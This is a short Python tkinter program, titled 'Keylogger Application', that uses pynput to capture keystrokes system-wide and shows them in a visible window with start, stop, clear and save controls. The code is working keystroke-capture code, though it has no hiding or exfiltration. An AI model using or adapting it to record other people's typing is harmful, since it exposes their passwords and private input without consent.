from tkinter import Tk, Text, END, Button, Label, Frame, filedialog
from pynput.keyboard import Listener

def handle_keypress(key):
    captured_key = str(key).replace("'", "")
    if captured_key == 'Key.space':
        captured_key = ' '
    elif captured_key == 'Key.enter':
        captured_key = '\n'
    elif 'Key' in captured_key:
        captured_key = ''
    
    output_text.insert(END, captured_key)

def clear_output():
    output_text.delete(1.0, END)

def save_output():
    file_location = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
    if file_location:
        with open(file_location, 'w') as file:
            file.write(output_text.get(1.0, END))

def initiate_keylogger():
    global key_listener
    key_listener = Listener(on_press=handle_keypress)
    key_listener.start()
    status_display.config(text="Status: Active")

def terminate_keylogger():
    global key_listener
    key_listener.stop()
    status_display.config(text="Status: Inactive")

# Set up the main window
app_window = Tk()
app_window.title("Keylogger Application")

# Frame for text display
text_frame = Frame(app_window)
text_frame.pack(pady=10)

output_text = Text(text_frame, height=15, width=50)
output_text.pack(side="left", padx=10)

# Frame for buttons
button_panel = Frame(app_window)
button_panel.pack(pady=10)

clear_btn = Button(button_panel, text="Clear", command=clear_output)
clear_btn.pack(side="left", padx=5)

save_btn = Button(button_panel, text="Save", command=save_output)
save_btn.pack(side="left", padx=5)

start_btn = Button(button_panel, text="Start", command=initiate_keylogger)
start_btn.pack(side="left", padx=5)

stop_btn = Button(button_panel, text="Stop", command=terminate_keylogger)
stop_btn.pack(side="left", padx=5)

# Status display
status_display = Label(app_window, text="Status: Inactive")
status_display.pack(pady=5)

app_window.mainloop()
